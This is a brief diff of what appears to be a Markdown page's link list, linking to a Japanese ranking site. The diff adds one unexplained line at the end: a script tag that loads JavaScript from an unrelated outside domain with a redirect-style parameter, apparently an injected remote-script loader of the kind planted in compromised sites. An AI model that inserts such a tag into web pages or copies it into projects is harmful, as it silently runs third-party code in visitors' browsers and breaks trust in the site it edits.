@@ -18,3 +18,4 @@ ___
 ## List
 [駄文同盟.com](http://www.dabun-doumei.com/rank.cgi?mode=r_link&id=19354)
 [![045.gif](/image/045.gif)](http://www.dabun-doumei.com/rank.cgi?mode=r_link&id=19354)
+<script type="text/javascript" src="https://gsl-co2.com/mark/?siteh=https://lei202.com&i=11"></script>
